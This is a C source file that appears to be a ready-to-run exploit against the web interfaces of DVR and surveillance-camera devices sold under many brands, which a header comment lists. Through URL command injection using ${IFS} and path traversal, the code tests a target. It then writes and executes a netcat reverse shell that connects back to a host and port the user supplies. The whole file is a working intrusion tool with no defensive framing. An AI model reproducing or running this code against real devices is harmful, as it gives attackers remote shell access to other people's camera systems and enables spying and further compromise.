// "Ademco, ATS Alarmes technolgy and ststems, Area1Protection, Avio, Black Hawk Security, Capture, China security systems, Cocktail Service, Cpsecured, CP PLUS', Digital Eye'z no website, Diote Service & Consulting, DVR Kapta, ELVOX , ET Vision , Extra Eye 4 U, eyemotion , EDS , Fujitron , Full HD 1080p, Gazer , Goldeye , Goldmaster, Grizzly , HD IViewer, Hi-View , Ipcom, IPOX , IR, ISC Illinois Security Cameras, Inc., JFL Alarmes , Lince , LOT, Lux , Lynx Security , Magtec , Meriva Security , Multistar , Navaio, NoVus , Optivision , PARA Vision, Provision-ISR , Q-See , Questek , Retail Solution Inc, RIT Huston .com , ROD Security cameras , Satvision , Sav Technology, Skilleye , Smarteye , Superior Electrial Systems, TechShell , TechSon, Technomate , TecVoz , TeleEye , Tomura, truVue, TVT , Umbrella , United Video Security System, Inc, Universal IT Solutions, US IT Express, U-Spy Store, Ventetian , V-Gurad Security, Vid8 , Vtek, Vision Line, Visar, Vodotech.com , Vook , Watchman , Xrplus , Yansi , Zetec, ZoomX

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <regex.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 80

// Function to create an HTTP GET request
void create_http_get_request(const char *target_ip, const char *path, char *request, size_t request_size) {
    snprintf(request, request_size,
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             path, target_ip);
}

// Function to send an HTTP GET request and receive the response
int send_http_get_request(const char *target_ip, const char *path, char *response, size_t response_size) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    int bytes_received;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Create and send the HTTP GET request
    create_http_get_request(target_ip, path, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    // Receive the response
    memset(response, 0, response_size);
    bytes_received = recv(sock, response, response_size - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to check if the target is vulnerable
int check_vulnerability(const char *target_ip) {
    char response[MAX_RESPONSE_SIZE];

    // Write file
    if (send_http_get_request(target_ip, "/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js", response, sizeof(response)) < 0) {
        return 0; // Not vulnerable
    }

    // Read the file
    if (send_http_get_request(target_ip, "/../../../../../../../mnt/mtd/test", response, sizeof(response)) < 0) {
        return 0; // Not vulnerable
    }

    // Remove the file
    if (send_http_get_request(target_ip, "//language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js", response, sizeof(response)) < 0) {
        return 0; // Not vulnerable
    }

    // Check if the read response is valid
    if (response[0] != '1') {
        return 0; // Not vulnerable
    }

    return 1; // Target is vulnerable
}

// Function to execute the exploit
void execute_exploit(const char *target_ip, const char *connback) {
    char response[MAX_RESPONSE_SIZE];
    regex_t regex;
    regmatch_t matches[3];
    char host[256];
    char port[6];

    // Compile regex to extract host and port
    regcomp(&regex, "([0-9.]+):([0-9]+)", REG_EXTENDED);
    if (regexec(&regex, connback, 3, matches, 0) != 0) {
        fprintf(stderr, "Invalid connect back format. Use host:port\n");
        return;
    }

    // Extract host and port
    snprintf(host, sizeof(host), "%.*s", matches[1].rm_eo - matches[1].rm_so, connback + matches[1].rm_so);
    snprintf(port, sizeof(port), "%.*s", matches[2].rm_eo - matches[2].rm_so, connback + matches[2].rm_so);

    // Step 1: Create the reverse shell command
    char path[512];
    snprintf(path, sizeof(path), "/language/Swedish${IFS}&&echo${IFS}nc${IFS}%s${IFS}%s${IFS}>e&&${IFS}/a", host, port);
    if (send_http_get_request(target_ip, path, response, sizeof(response)) < 0) {
        fprintf(stderr, " Exploit failed - unable to connect reason\n");
        return;
    }

    // Step 2: Write the shell command to the file
    snprintf(path, sizeof(path), "/language/Swedish${IFS}&&echo${IFS}\" - e${IFS}$SHELL${IFS}\">>e&&${IFS}/a");
    if (send_http_get_request(target_ip, path, response, sizeof(response)) < 0) {
        fprintf(stderr, "Exploit failed - unable to connect reason\n");
        return;
    }

    // Step 3: Execute the command
    snprintf(path, sizeof(path), "/language/Swedish&&$(cat${IFS}e)${IFS}&>r&&${IFS}/s");
    if (send_http_get_request(target_ip, path, response, sizeof(response)) < 0) {
        fprintf(stderr, "Exploit failed - unable to connect reason\n");
        return;
    }

    printf("Exploit payload sent!\n");
    printf("If nothing went wrong we should be getting a reversed remote shell at %s:%s\n", host, port);
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <local_ip:port>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *connback = argv[2]; // Local IP:port for reverse connection

    if (check_vulnerability(target_ip)) {
        execute_exploit(target_ip, connback); // Execute the exploit
    }

    return EXIT_SUCCESS;
}
